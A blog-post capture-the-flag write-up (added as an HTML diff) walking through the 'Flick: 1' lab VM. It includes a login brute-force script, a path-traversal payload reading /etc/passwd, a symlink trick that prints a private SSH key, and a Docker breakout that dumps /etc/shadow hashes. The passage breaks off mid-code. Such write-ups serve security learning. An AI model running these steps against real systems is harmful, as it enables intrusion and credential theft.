@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Flick: 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-08-16">August 16, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/flick">flick</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Flick: 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Completing &ldquo;flick&rdquo; will require some sound thinking, good enumeration skills &amp; time!</p>
+
+<p>The objective is to find and read the flag that lives in /root/.
+As a bonus, can you get root command execution?</p>
+
+<p>Good Luck! @leonjza</p>
+
+<h2 id="port-scan:349ad66c7b20ba925d9eeb00398f8306">Port Scan</h2>
+
+<p>When Flick boots up, it&rsquo;s nice enough to display its IP address at the login prompt.  I therefore went straight ahead with an Nmap scan.</p>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sS -p- 192.168.127.104 &amp;&amp; nmap -n -sU 192.168.127.104
+  
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8881/tcp open  unknown
+</code></pre>
+
+<p>I began by going straight to the service on 8881.</p>
+
+<pre><code class="language-text">root@kali:~# nc 192.168.127.104 8881 Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
+&gt; flick
+OK: flick
+  
+&gt; leonjza
+OK: leonjza
+</code></pre>
+
+<p>No matter what I threw at it, it just echo&rsquo;d it back.  I tried fuzzing it with overflow and format strings etc, but no dice.  Bruteforcing isn&rsquo;t really the way these challenges usually go; but I wrote a short Python script that read in the lines from some simple, short password lists and sent them to the application.  Whilst this was running, I had a look at the SSH port.</p>
+
+<p>As we&rsquo;ve seen in some previous challenges, simply banner grabbing the SSH service is not always enough.  You won&rsquo;t get to see the contents of <code>/etc/issue</code> (OS config dependant), until you attempt a proper connection to the service.</p>
+
+<pre><code class="language-text">root@kali:~# ssh 192.168.127.104
+\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
+\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
+\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
+[...snip...]
+\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
+\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
+\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d
+  
+ .o88o. oooo   o8o            oooo        
+ 888 `&quot; `888   `&quot;'            `888        
+o888oo   888  oooo   .ooooo.   888  oooo  
+ 888     888  `888  d88' `&quot;Y8  888 .8P'   
+ 888     888   888  888        888888.    
+ 888     888   888  888   .o8  888 `88b.  
+o888o   o888o o888o `Y8bod8P' o888o o888o 
+  
+root @ 192.168.127.104's password: 
+</code></pre>
+
+<p>A large chuck of hex is printed out, which I saved to a file.  I then stripped the newlines and \x&rsquo;s, then decoded with Python.</p>
+
+<pre><code class="language-text">root@kali:~/vuln/flick# cat hex | tr -d '\n' | tr -d '/\\x' &gt;&gt; hex_stripped
+  
+root@kali:~/vuln/flick# python
+&gt;&gt;&gt; string = open('hex_stripped', 'r').readline()
+&gt;&gt;&gt; string.decode('hex')
+'Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ=='
+</code></pre>
+
+<p>Unless I&rsquo;m very much mistake, this is a base64 string.</p>
+
+<pre><code class="language-text">&gt;&gt;&gt; string.decode('hex').decode('base64')
+'Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0='
+</code></pre>
+
+<p>Still base64&hellip; It must be encoded multiple times&hellip; (about 16 as it turned out!).  In the end, I ended up with the following:</p>
+
+<p><code>tabupJievas8Knoj</code></p>
+
+<p>I went back to the service on 8881 and entered this as the password.</p>
+
+<pre><code class="language-text">root@kali:~/vuln/flick# nc 192.168.127.104 8881
+Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
+&gt; tabupJievas8Knoj
+OK: tabupJievas8Knoj
+  
+Accepted! The door should be open now :poolparty:
+</code></pre>
+
+<p>Another quick Nmap scan showed that port 80 was now open.</p>
+
+<h2 id="flick-a-photo:349ad66c7b20ba925d9eeb00398f8306">Flick-a-Photo</h2>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/flick-1/flick-a-photo.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>This looked to be a photo-gallery type application.  There isn&rsquo;t much to see with the exception of a login page.  There is a give away piece of information here:</p>
+
+<p><code>While we are testing the site, use the demo credentials that have been configured for the first user.</code></p>
+
+<p>I first tried <code>demo:demo</code>, which failed.  I assumed the username was going to be demo, but that the password was slightly more complex.  I used john&rsquo;s jumbo rules to create a password list based on the word <code>demo</code>.</p>
+
+<pre><code class="language-text">root@kali:~/vuln/flick# echo demo &gt; wordlist
+root@kali:~/vuln/flick# john --rules=jumbo --wordlist=wordlist --stdout &gt;&gt; wordlist 
+</code></pre>
+
+<p>This created just over 5000 words, which I ran through <code>Hydra</code>.  Rather annoyingly, it returnded every password as correct and I gave up trying to work out why.  So instead, I fired the wordlist through a make-shift script.</p>
+
+<pre><code class="language-bash">#!/bin/bash
+  
+wordlist=&quot;/root/vuln/flick/wordlist&quot;
+cookie=&quot;laravel_session=eyJpdiI6ImxoMzM2R2xLU3lxcCtFTzl6SWY0RHlyQ1Q4SEpVeGs0bEJSd3hDc3BrdlE9IiwidmFsdWUiOiJtaHliTW9ZXC9nUXFnUVdQaEJvYmo4a2c3VEFXRWcxekQ0azdwTnh2a2pLR0ZSRm5Hd2E0dHdmWkVwT29pdVdZR0x0OHdEZkdqSHQ5RVNKdENSak9jYlE9PSIsIm1hYyI6ImIyMjNiYzYwNzE4ZTM4Mzg2NDQ2NDFlZGU3Y2QzMTEwNmYwYmVkY2IyMWY1ODZkMmE4NDA3YTQwZmE5YzRjZWIifQ%3D%3D&quot;
+  
+while read p; do
+  
+        curl -s -L http://192.168.127.104/login/login -b &quot;$cookie&quot; --data &quot;username=demo&amp;password=$p&quot; | grep incorrect &gt; /dev/null
+  
+        if [[ $? -ne 0 ]]; then
+  
+                echo &quot;Password is: $p&quot;
+                break
+        fi
+  
+done &lt; $wordlist
+</code></pre>
+
+<pre><code class="language-text">root@kali:~/vuln/flick# ./login.sh 
+Password is: demo123
+</code></pre>
+
+<p>Now I was able to login and saw that new functionality in the application had become available - namely to upload files and download existing ones.  Upload functionality just screams PHP Shell upload - but long story short, it doesn&rsquo;t work here ;)</p>
+
+<p>With that avenue out, I looked at the download function more carefully.  The href for one of the download links, looks like this:</p>
+
+<p><code>http://192.168.127.104/image/download?filename=images/mPTRlZ8Bf3Wt</code></p>
+
+<p>From my experimentation with the upload function, I knew that files are assigned a seemingly random name with their extensions removed and placed into the images directory.</p>
+
+<p>I wondered if this may be vulnerable to LFI.  So I began requesting <code>/etc/passwd</code>.</p>
+
+<p><code>?filename=../../../../etc/passwd</code> did not work, so perhaps there is some filtering in place?</p>
+
+<pre><code class="language-text">root@kali:~/vuln/flick# curl -s -L http://192.168.127.104/image/download?filename=..././..././..././..././etc/passwd -b &quot;laravel_session=eyJpdiI6IjBUWTlcL0pZejRLNzYwMzlKb1dLYmdqQ1NOU0x1Z2NYM2Y3UXRYcHJocG1JPSIsInZhbHVlIjoid3VmZzQ5cmtvTDhOK09cL0ROeXpMZmY5WEwzT3Q0ZXRZTkpyQXJ4Mm9QdjJ1UGo5NDd0ZFFTRHU2MUJCRjRXdEhrcXRhRjRFWEZPeVFBbXBHcVwvSER4UT09IiwibWFjIjoiYjc4YWEyOWQwN2RkMzU1YWFkYTFkOTFhNDFiZThmNDUxNjgwNGRhMGUzZDM3M2QwMTE4NGFiYmNiMTE1MGFhYyJ9&quot;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+whoopsie:x:103:106::/nonexistent:/bin/false
+landscape:x:104:109::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
+mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
+dean:x:1001:1001:,,,:/home/dean:/bin/bash
+</code></pre>
+
+<p>Now that I could read files on the system, I began enumerating the system configs.  I started with the Apache config to find the web root.</p>
+
+<pre><code class="language-text">?filename=..././..././..././..././etc/apache2/sites-enabled/000-default
+    DocumentRoot /var/www/flick_photos/public
+    &lt;Directory /&gt;
+        Options FollowSymLinks
+        AllowOverride None
+    &lt;/Directory&gt;
+    &lt;Directory /var/www/flick_photos/public&gt;
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        Order allow,deny
+        allow from all
+    &lt;/Directory&gt;
+</code></pre>
+
+<p>The technology behind the application has already been given away in the cookie header - Laravel.  A &ldquo;PHP Framework For Web Artisans&rdquo;.  A little bit of research will take you straight to their GitHub page, which is obviously really handy since you can view the entire application structure.  This gives you the exact filepaths to hit with the LFI.</p>
+
+<p>I downloaded a few config files, including <code>app/config/database.php</code>, which included an interesting commented line.</p>
+
+<p><code>'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!</code></p>
+
+<p>So I went ahead and downloaded this file too.  Even though it&rsquo;s a binary file, enough of it is displayed in ASCII for it to be useable without having to download it to a file etc.</p>
+
+<pre><code class="language-text">** This file contains an SQLite 2.1 database **(u���x^�
+                                                           &quot;^tableold_usersold_users3CREATE TABLE old_users (
+  username text,
+  password text
+)�xdI�IpaulnejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi�J�   JrobinJoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1J�   JjamesscujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5I�IdeanFumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA�
+</code></pre>
+
+<p>I knew Robin and Dean were users on the system, so I tried SSH with the following:</p>
+
+<pre><code class="language-text">dean: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
+robin: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1J
+</code></pre>
+
+<p>The creds for Robin did not work, but I was able to SSH as Dean.</p>
+
+<h2 id="dean:349ad66c7b20ba925d9eeb00398f8306">Dean</h2>
+
+<p>Dean has two files in his home directory:</p>
+
+<pre><code class="language-text">dean@flick:~$ ls -l
+-rw-r--r-- 1 root  root  1250 Aug  4 12:56 message.txt
+-rwsr-xr-x 1 robin robin 8987 Aug  4 14:45 read_docker
+  
+dean@flick:~$ cat message.txt 
+  
+Hi Dean,
+  
+I will be away on leave for the next few weeks. I have asked the admin guys to
+write a quick script that will allow you to read my .dockerfile for flick-
+a-photo so that you can continue working in my absense.
+  
+The .dockerfile is in my home, so the path for the script will be something like
+/home/robin/flick-dev/
+  
+Please call me if you have any troubles!
+  
+dean@flick:~$ strings read_docker 
+fopen
+[...snip...]
+/Dockerfile
+ERROR: A path is required!
+Usage is: %s /path/to/dockerfile
+</code></pre>
+
+<p>So it appears this binary (which is owned by Robin and has the SUID bit set), simply opens a file called Dockerfile (which is hardcoded) when given a directory.  First I was able to read Robin&rsquo;s Dockerfile as mentioned in the message.</p>
+
+<pre><code class="language-text">dean@flick:~$ ./read_docker /home/robin/flick-dev/
+# Flick-a-photo dev env
+RUN apt-get update &amp;&amp; apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli &amp;&amp; apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*
+  
+CMD [&quot;/usr/sbin/apache2&quot;, &quot;-D&quot;, &quot;FOREGROUND&quot;]
+</code></pre>
+
+<p>Because there doesn&rsquo;t appear to be any sort of checks built into the binary, I thought it would be able to read any arbitary file that Robin has read permission for.</p>
+
+<pre><code class="language-text">dean@flick:~$ echo &quot;This is a test&quot; &gt; /tmp/Dockerfile
+dean@flick:~$ ./read_docker /tmp/
+This is a test
+</code></pre>
+
+<p>I used this idea, and created a symlink to Robin&rsquo;s private SSH key.</p>
+
+<pre><code class="language-text">dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
+
+dean@flick:~$ ./read_docker .
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
+ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
+FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
+S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
+CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
+d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
+jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
+wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
+tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
+Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
+wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
+mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
+l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
+JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
+gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
+JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
+rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
+PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
+zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
+AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
+EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
+mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
+JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
+Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
+VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<p>After copying this key to my Kali VM, I was able to SSH in as Robin :)</p>
+
+<h2 id="robin:349ad66c7b20ba925d9eeb00398f8306">Robin</h2>
+
+<p>There was nothing in Robin&rsquo;s home directory, but a quick check of his sudo rights showed the following:</p>
+
+<pre><code class="language-text">robin@flick:~$ sudo -l
+  
+User robin may run the following commands on this host:
+    (root) NOPASSWD: /opt/start_apache/restart.sh
+  
+robin@flick:~$ ls -l /opt/start_apache/
+total 8
+-rwx------ 1 root root   79 Aug  4 17:04 restart.sh
+-rwx------ 1 root root 2285 Aug  4 17:09 start.py
+</code></pre>
+
+<p>Because there is no read access to these scripts, I tried to blindly manipulate path variables to see if I could force it to execute a binary of my own choosing.  However, this did not work.  I moved back to this Docker idea and found that an older version was installed.</p>
+
+<pre><code class="language-text">robin@flick:~$ docker -v
+Docker version 0.11.0, build 15209c3
+</code></pre>
+
+<p>Some quick research into docker will show you that this version is vulnerable to a container breakout, allowing you to read any file on the system.  The more obvious path for this is to read <code>/etc/shadow</code> or the root SSH key.  But I thought this would be a long shot, if root had a strong password and SSH access disabled.  It would allow me to read the contents of <code>restart.sh</code> and <code>start.py</code> however.</p>
+
+<p>First, I listed all the current containers.</p>
+
+<pre><code class="language-text">robin@flick:~$ docker ps -l
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+da9387a40106        ubuntu:14.04        /bin/bash           8 minutes ago       Up 8 minutes                            compassionate_euclid
+</code></pre>
+
+<p>You can run one-off commands within the container:</p>
+
+<pre><code class="language-text">robin@flick:~$ docker run ubuntu id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>Or you can interact with it through a console session:</p>
+
+<pre><code class="language-text">robin@flick:~$ docker run -t -i ubuntu
+root@af56205351e4:/#
+</code></pre>
+
+<p>Next, I was able to determine that IP traffic was routable between the container and the host.  Both the host and container had netcat installed, which means I was able to tranfer files in and out of the container.  I was able to use this to transfer the shocker exploit into the container.  Because <code>gcc</code> was only install on the host, I had to compile it before moving it in.</p>
+
+<pre><code class="language-text">robin@flick:~$ nc -lvv 4444 &lt; shocker
+root@af56205351e4:/root# nc 192.168.127.104 4444 &gt; shocker
+</code></pre>
+
+<p>Executing shocker within the container, successfully dumped <code>/etc/shadow</code> of the host!</p>
+
+<pre><code class="language-text">root@af56205351e4:/root# ./shocker 
+[***] docker VMM-container breakout Po(C) 2014             [***]
+[***] The tea from the 90's kicks your sekurity again.     [***]
+[***] If you have pending sec consulting, I'll happily     [***]
+[***] forward to my friends who drink secury-tea too!      [***]
+  
+&lt;enter&gt;
+  
+[*] Resolving 'etc/shadow'
+  
+[…snip…]
+  
+[!] Win! /etc/shadow output follows:
+
+root:$6$rOirJ02l$HmauQaCRxYGzGyLeUcNOo0d9FkmJ0Hp2qA8DhAIWd7gJs32MskKYEf6dPxrwZ8XyaL0CXtFe4HBvtMHQCfLG80:16283:0:99999:7:::
+daemon:*:16283:0:99999:7:::
+bin:*:16283:0:99999:7:::
+sys:*:16283:0:99999:7:::
+sync:*:16283:0:99999:7:::
+games:*:16283:0:99999:7:::
+man:*:16283:0:99999:7:::
+lp:*:16283:0:99999:7:::
+mail:*:16283:0:99999:7:::
+news:*:16283:0:99999:7:::
+uucp:*:16283:0:99999:7:::
+proxy:*:16283:0:99999:7:::
+www-data:*:16283:0:99999:7:::
+backup:*:16283:0:99999:7:::
+list:*:16283:0:99999:7:::
+irc:*:16283:0:99999:7:::
+gnats:*:16283:0:99999:7:::
+nobody:*:16283:0:99999:7:::
+libuuid:!:16283:0:99999:7:::
+syslog:*:16283:0:99999:7:::
+messagebus:*:16283:0:99999:7:::
+whoopsie:*:16283:0:99999:7:::
+landscape:*:16283:0:99999:7:::
+sshd:*:16283:0:99999:7:::
+robin:$6$j5lRdjqM$HrKVVv4FSZ0StRLgXSe3Nt8bvsaE6yPdRRvggXdW4lIxmVs8t8ny1WWXNkdiF/ccAWU.jthvwQKgWAG5JtZBv1:16284:0:99999:7:::
+mysql:!:16283:0:99999:7:::
+dean:$6$kLXH5HBN$vAiHt14LlYtq9EDoIffiZFP9goUeyvn5cHTaehsysvg9TFQlSAMZuGer5OqEef2ONAeMHi6hU.OygO7Uo6b8Z.:16284:0:99999:7:::
+</code></pre>
+
+<p>Trying to grab the flag this way resulted in a bit of a troll :p</p>
+
+<p><code>Errr, you are close, but this is not the flag you are looking for.</code></p>
+
+<p>So I re-focussed on two scripts files within <code>/opt</code>.  <code>Restart.sh</code> is rather simple:</p>
+
+<pre><code class="language-bash">#!/bin/sh
+/usr/sbin/service apache2 restart
+/usr/bin/supervisorctl restart all
+</code></pre>
+
+<p>A quick look at the supervisor config&rsquo;s reveased the following:</p>
+
+<pre><code class="language-text">/etc/supervisor/conf.d/start_apache.conf
+  
+[program:start_apache]
+command=/opt/start_apache/start.py
+process_name = %(program_name)s-80%(process_num)02d
+stdout_logfile = /var/log/start_apache-80%(process_num)02d.log
+stdout_logfile_maxbytes=100MB
+stdout_logfile_backups=10
+numprocs=1
+directory=/opt/start_apache
+stopwaitsecs=1
+user=root
+stopasgroup=true
+</code></pre>
+
+<p>So this runs <code>/opt/start_apache/start.py</code>.  Finally, if we have a peak at that, we find that it&rsquo;s the script responsible for the service on 8881 we used earlier.  Interestingly, there&rsquo;s a little debugging snippet within the code.</p>
+
+<pre><code class="language-text"># see if /tmp has a configuration to load.
